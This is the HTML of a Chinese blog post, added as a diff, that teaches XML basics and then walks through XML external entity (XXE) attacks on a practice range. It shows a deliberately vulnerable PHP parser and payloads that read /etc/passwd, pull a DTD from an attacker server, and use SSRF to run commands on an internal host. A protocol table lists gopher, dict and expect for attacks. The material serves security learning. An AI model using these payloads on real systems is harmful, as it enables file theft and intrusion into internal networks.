@@ -1,0 +1,742 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>XXE基础 | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="0x00.基础知识1. XIMIL是一种标记语言XML指可扩展标记语言(EXtensible Markup Language)把数据结构化后传输给对方让对方在结构化的数据中进行读取。
+假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是zhang@xx.com”。
+
+非结构化（纯文本）：你发微信：“张三电话010-8888，手机1380000，邮箱zhang@xx.com”。如果同事的电脑要提取“手机号”，得写复杂的模糊匹配（万一张三写了“Tel”或者“Mobile”呢？）。
+
+结构化（XML）：
+  &amp;lt;员工&amp;gt;    &amp;lt;姓名&amp;gt;张三&amp;lt;/姓名&amp;gt;    &amp;lt;座机&amp;gt;010-8888&amp;lt;/座机&amp;gt;    &amp;lt;手机&amp;gt;1380000&amp;lt;/手机&amp;gt;    &amp;lt;邮箱&amp;gt;zhang@xx.com&amp;lt;/邮箱&amp;gt;&amp;lt;/员工&amp;gt;
+
+2. 标签没有被预定义，需要自行定义
+这是XML与它的“表哥”HTML最本质的区别：
+
+HTML（预定义标签）：浏览器只认识 [h1]（大标题）、[p]（段落）、[table]（表格）。标签是写死的，你不能自己发明一个 &amp;lt;帅哥&amp;gt; 标签让浏览器渲染，因为它不认识。
+XML（自定义标签）：XML没有任何现成的标签库。它相当于给你一张白纸，完全由你（发送方和接收方）商量着来。比如，你们俩约定好用 &amp;lt;员工工号&amp;gt; 来传工号，用 &amp;lt;紧急联系人&amp;gt; 传亲属电话。只要双方都认这个“自定义名字”，数据就能正确读取。
+
+3. 没有任何行为的 XML 的漏洞何处来？
+绝大多数（超过95%）的XXE漏洞，核心根源就是利用了DTD声明中的“实体（ENTITY）声明”功能。
+DTD声明规定：这个 XML 文档里可以出现哪些标签、标签之间的层级关系、标签里能填什么类型的数据，以及可以提前定义哪些“快捷方式（实体）"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="XXE基础"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"><script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    processEscapes: true,
+    processEnvironments: true
+  },
+  options: {
+    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  startup: {
+    pageReady: () => {
+      return MathJax.startup.defaultPageReady();
+    }
+  }
+};
+</script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> XXE基础</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00.基础知识"></a>0x00.基础知识</h2><p><strong>1. XIMIL是一种标记语言</strong><br>XML指可扩展标记语言(EXtensible Markup Language)把<strong>数据结构化</strong>后<strong>传输</strong>给对方让对方在结构化的数据中进行读取。</p>
+<p>假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是<a href="mailto:&#x7a;&#x68;&#97;&#x6e;&#x67;&#64;&#x78;&#x78;&#46;&#99;&#111;&#x6d;">zhang@xx.com</a>”。</p>
+<ul>
+<li><p><strong>非结构化（纯文本）</strong>：你发微信：“张三电话010-8888，手机1380000，邮箱<a href="mailto:&#122;&#x68;&#97;&#110;&#103;&#64;&#120;&#x78;&#x2e;&#x63;&#111;&#x6d;">zhang@xx.com</a>”。<br>如果同事的电脑要提取“手机号”，得写复杂的模糊匹配（万一张三写了“Tel”或者“Mobile”呢？）。</p>
+</li>
+<li><p><strong>结构化（XML）</strong>：</p>
+  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">员工</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">座机</span>&gt;</span>010-8888<span class="tag">&lt;/<span class="name">座机</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">手机</span>&gt;</span>1380000<span class="tag">&lt;/<span class="name">手机</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">邮箱</span>&gt;</span>zhang@xx.com<span class="tag">&lt;/<span class="name">邮箱</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">员工</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 标签没有被预定义，需要自行定义</strong></p>
+<p>这是XML与它的“表哥”HTML最本质的区别：</p>
+<ul>
+<li>HTML（预定义标签）：浏览器只认识 [h1]（大标题）、[p]（段落）、[table]（表格）。标签是写死的，你不能自己发明一个 &lt;帅哥&gt; 标签让浏览器渲染，因为它不认识。</li>
+<li>XML（自定义标签）：XML没有任何现成的标签库。它相当于给你一张白纸，完全由你（发送方和接收方）商量着来。比如，你们俩约定好用 &lt;员工工号&gt; 来传工号，用 &lt;紧急联系人&gt; 传亲属电话。只要双方都认这个“自定义名字”，数据就能正确读取。</li>
+</ul>
+<p><strong>3. 没有任何行为的 XML 的漏洞何处来？</strong></p>
+<p>绝大多数（超过95%）的XXE漏洞，核心根源就是利用了<strong>DTD声明</strong>中的“实体（ENTITY）声明”功能。</p>
+<p><strong>DTD声明规定</strong>：这个 XML 文档里可以出现哪些标签、标签之间的层级关系、标签里能填什么类型的数据，以及可以提前定义哪些“快捷方式（实体）</p>
+<ul>
+<li><strong>内部DTD</strong>：DTD 代码直接写在 XML 文件内部的 &lt;!DOCTYPE&gt; 标签的方括号 [] 中。这种方式仅对该 XML 文件有效  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 内部DTD声明：定义根元素为 学生，包含 姓名 和 年龄 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 学生 [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT 学生 (姓名, 年龄)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT 姓名 (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT 年龄 (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">学生</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>20<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>外部DTD</strong>：DTD 代码存放在一个<strong>独立的 .dtd 外部文件</strong>中，XML 通过 SYSTEM（私有）或 PUBLIC（公共）引用该文件。这种方式可以实现多个 XML 文件共用同一个 DTD 规范。  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用 SYSTEM 引用本地外部 DTD 文件 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 用户 <span class="keyword">SYSTEM</span> <span class="string">&quot;user.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">用户</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">昵称</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">昵称</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">等级</span>&gt;</span>5<span class="tag">&lt;/<span class="name">等级</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">用户</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>4. xml语法规则</strong></p>
+<blockquote>
+<p><strong>1. 必须且只能有一个根元素</strong></p>
+<blockquote>
+<p>XML 文档的最外层必须且只能有一个父标签，所有其他标签都必须嵌套在它里面。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;&gt;正确：<span class="tag">&lt;<span class="name">学校</span>&gt;</span> <span class="tag">&lt;<span class="name">班级</span>&gt;</span>1班<span class="tag">&lt;/<span class="name">班级</span>&gt;</span> <span class="tag">&lt;<span class="name">班级</span>&gt;</span>2班<span class="tag">&lt;/<span class="name">班级</span>&gt;</span> <span class="tag">&lt;/<span class="name">学校</span>&gt;</span></span><br><span class="line">&gt;&gt;错误：<span class="tag">&lt;<span class="name">班级</span>&gt;</span>1班<span class="tag">&lt;/<span class="name">班级</span>&gt;</span> <span class="tag">&lt;<span class="name">班级</span>&gt;</span>2班<span class="tag">&lt;/<span class="name">班级</span>&gt;</span>（没有根元素）</span><br></pre></td></tr></table></figure><p><strong>2. 标签必须成对且正确嵌套</strong><br>有开始标签就必须有结束标签（或自闭合），且交叉嵌套是绝对禁止的。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;正确：<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>（后打开的标签先关闭）</span><br><span class="line">&gt;错误：<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>（交叉嵌套，报错）</span><br></pre></td></tr></table></figure><p><strong>3. 标签严格区分大小写</strong><br>XML 是大小写敏感的，<Name>、<name> 和 <NAME> 是三个完全不同的标签。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;正确：<span class="tag">&lt;<span class="name">Name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">&gt;错误：<span class="tag">&lt;<span class="name">Name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span>（开头大写，结尾小写，不匹配）</span><br></pre></td></tr></table></figure><p><strong>4. 属性值必须用引号引起来</strong><br>标签的属性值必须用双引号 “ 或单引号 ‘ 包住，不能裸奔。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;正确：<span class="tag">&lt;<span class="name">员工</span> <span class="attr">id</span>=<span class="string">&quot;001&quot;</span> <span class="attr">性别</span>=<span class="string">&#x27;男&#x27;</span>&gt;</span></span><br><span class="line">&gt;&gt;错误：<span class="tag">&lt;<span class="name">员工</span> <span class="attr">id</span>=<span class="string">001</span>&gt;</span>（缺少引号）</span><br></pre></td></tr></table></figure><p><strong>5. 特殊字符必须用实体引用替换</strong><br>在文本内容中，&lt; 和 &amp; 是保留字符，不能直接写，必须换成预定义的实体。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;&gt;1. &lt; -&gt;  <span class="symbol">&amp;lt;</span>  小于号（必须转义） </span><br><span class="line">&gt;&gt;2. &gt; -&gt;  <span class="symbol">&amp;gt;</span>  大于号（建议转义） </span><br><span class="line">&gt;&gt;3. &amp; -&gt;  <span class="symbol">&amp;amp;</span>  与符号（必须转义） </span><br><span class="line">&gt;&gt;4. &quot; -&gt;  <span class="symbol">&amp;quot;</span>  双引号 </span><br><span class="line">&gt;&gt;5. &#x27; -&gt;  <span class="symbol">&amp;apos;</span>  单引号 </span><br></pre></td></tr></table></figure><p><strong>6. 注释不能嵌套</strong><br>注释的格式是 <!-- 注释内容 -->，但注释内容里面不能再出现 –。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;正确：<span class="comment">&lt;!-- 这是用户信息 --&gt;</span></span><br><span class="line">&gt;&gt;错误：<span class="comment">&lt;!-- 外层 &lt;!-- 内层 --&gt;</span> 外层 --&gt;（嵌套注释，报错）</span><br></pre></td></tr></table></figure></blockquote>
+</blockquote>
+<p>感谢重庆橙科技的XXE靶场：<a target="_blank" rel="noopener" href="https://github.com/mcc0624/XXE.git">https://github.com/mcc0624/XXE.git</a><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_1.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="0x01-XXE漏洞演示"><a href="#0x01-XXE漏洞演示" class="headerlink" title="0x01 XXE漏洞演示"></a>0x01 XXE漏洞演示</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);                  <span class="comment">// 关闭所有错误输出，屏蔽报错信息</span></span><br><span class="line">	<span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>); <span class="comment">// 开启XML外部实体加载，支持解析外部实体</span></span><br><span class="line">	<span class="variable">$xml</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// 获取POST原始请求体XML数据</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xml</span>))&#123;                     <span class="comment">// 判断是否成功读取到XML内容</span></span><br><span class="line">	    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();         <span class="comment">// 实例DOMDocument用于解析XML</span></span><br><span class="line">	    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">// 加载XML，开启实体解析、加载DTD</span></span><br><span class="line">	    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>); <span class="comment">// dom对象转simpleXml，简化节点读取</span></span><br><span class="line">	    <span class="variable">$benben</span> = <span class="variable">$creds</span>-&gt;admin;           <span class="comment">// 读取xml下admin节点内容</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="variable">$benben</span>;                      <span class="comment">// 输出admin节点文本</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);            <span class="comment">// 高亮打印当前脚本源代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于payload：<code>&lt;root&gt;&lt;admin&gt;hacker&lt;/admin&gt;&lt;/root&gt;</code><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_2.png" alt="在这里插入图片描述"></p>
+<p>对于payload：<code>&lt;admin&gt;hacker&lt;/admin&gt;</code><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_3.png" alt="在这里插入图片描述"></p>
+<p>最终payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_4.png" alt="在这里插入图片描述"></p>
+<p><strong>补充：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">协议分类</th>
+<th align="left">协议名称</th>
+<th align="left">核心功能与利用场景</th>
+<th align="center">PHP</th>
+<th align="center">Java</th>
+<th align="center">.NET</th>
+<th align="center">Python</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>基础通用</strong></td>
+<td align="left"><code>file://</code></td>
+<td align="left"><strong>读取本地文件</strong> (XXE&#x2F;LFI 基础)</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>http://</code> &#x2F; <code>https://</code></td>
+<td align="left"><strong>访问网页&#x2F;内网</strong> (SSRF 基础)</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>ftp://</code></td>
+<td align="left">文件传输&#x2F;内网探测</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td align="left"><strong>PHP 特有</strong></td>
+<td align="left"><code>php://</code></td>
+<td align="left"><strong>输入流&#x2F;过滤器</strong> (<code>php://input</code> 执行代码, <code>php://filter</code> 读源码)</td>
+<td align="center">✅</td>
+<td align="center"></td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>phar://</code></td>
+<td align="left"><strong>Phar 反序列化</strong> (触发反序列化漏洞)</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>zip://</code></td>
+<td align="left"><strong>读取压缩包</strong> (<code>zip://archive.zip#config.php</code>)</td>
+<td align="center">✅</td>
+<td align="center"></td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>glob://</code></td>
+<td align="left"><strong>目录遍历</strong> (<code>glob:///etc/pass*</code> 猜测文件名)</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>data://</code></td>
+<td align="left"><strong>数据流执行</strong> (<code>data://text/plain;base64,...</code> 执行代码)</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+<td align="center">⚠️</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>compress.zlib</code></td>
+<td align="left">透明读取压缩文件 (<code>.gz</code>)</td>
+<td align="center">✅</td>
+<td align="center"></td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"><strong>Java 特有</strong></td>
+<td align="left"><code>jar://</code></td>
+<td align="left"><strong>读取 Jar 包</strong> (<code>jar:file:/app.jar!/config.properties</code>)</td>
+<td align="center">❌</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>netdoc://</code></td>
+<td align="left">加载本地文档 (类似 file 协议，旧版 JDK)</td>
+<td align="center">❌</td>
+<td align="center">✅</td>
+<td align="center"></td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>mailto://</code></td>
+<td align="left">触发邮件发送 (URL 形式)</td>
+<td align="center"></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"><strong>SSRF 专用</strong></td>
+<td align="left"><code>gopher://</code></td>
+<td align="left"><strong>发送原始 TCP 包</strong> (攻击 Redis&#x2F;Memcached，伪造请求)</td>
+<td align="center">️</td>
+<td align="center">⚠️</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>dict://</code></td>
+<td align="left"><strong>端口探测&#x2F;Redis</strong> (探测内网端口，Redis 未授权访问)</td>
+<td align="center">⚠️</td>
+<td align="center">️</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>ldap://</code></td>
+<td align="left">目录服务探测 (内网 LDAP 服务探测)</td>
+<td align="center">⚠️</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">⚠️</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"><code>expect://</code></td>
+<td align="left"><strong>命令执行</strong> (需安装 PHP expect 扩展)</td>
+<td align="center">️</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+</tbody></table>
+<p><strong>图例说明：</strong></p>
+<ul>
+<li>✅：原生支持（无需额外配置，最危险）</li>
+<li>⚠️：条件支持（需要特定扩展如 cURL，或特定版本如旧版 JDK）</li>
+<li>❌：不支持（该语言环境下无法直接使用此协议）</li>
+</ul>
+<hr>
+<h2 id="0x02-XXE使用外部实体检索文件"><a href="#0x02-XXE使用外部实体检索文件" class="headerlink" title="0x02.XXE使用外部实体检索文件"></a>0x02.XXE使用外部实体检索文件</h2><p>对于一个登录框，怎么判断其存在xxe呢？<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_5.png" alt="在这里插入图片描述"></p>
+<p>admin登录<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_6.png" alt="在这里插入图片描述"></p>
+<p>hacker登录<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_7.png" alt="在这里插入图片描述"></p>
+<p>通过两次登录可知，<code>username</code>会回显到登录页面，那是不是存在一个可能，外带的数据也在这个位置显示出来（与sql注入回显数据有点像），<strong>即我们可以确定存在回显位置</strong></p>
+<p>检查（使用各种手段，抓包等等）数据提交方式，发现是xml数据提交（还是抓包直观）<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_8.png" alt="在这里插入图片描述"></p>
+<p>实际上F12也行·<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_9.png" alt="在这里插入图片描述"></p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_10.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="0x03-利用XXE参数实体读取文件"><a href="#0x03-利用XXE参数实体读取文件" class="headerlink" title="0x03.利用XXE参数实体读取文件"></a>0x03.利用XXE参数实体读取文件</h2><p>与上同理，但是存在输入检查<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_11.png" alt="在这里插入图片描述"></p>
+<p><strong>使用攻击服务器绕过</strong>：</p>
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_12.png" alt="在这里插入图片描述"></p>
+<p>创建<strong>hacker.dtd</strong>文件<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_13.png" alt="在这里插入图片描述"></p>
+<p>即dtd： <code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
+<p>上传到攻击服务器<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_14.png" alt="在这里插入图片描述"></p>
+<p>则有payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;存放dtd文件的url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_15.png" alt="在这里插入图片描述"></p>
+<p>成功读取，搞定收工</p>
+<hr>
+<h2 id="0x04-利用XXE进行SSRF漏洞利用"><a href="#0x04-利用XXE进行SSRF漏洞利用" class="headerlink" title="0x04.利用XXE进行SSRF漏洞利用"></a>0x04.利用XXE进行SSRF漏洞利用</h2><p>靶场问题，忽略<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_16.png" alt="在这里插入图片描述"></p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://10.1.2.3/?cmd=cat%20./flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
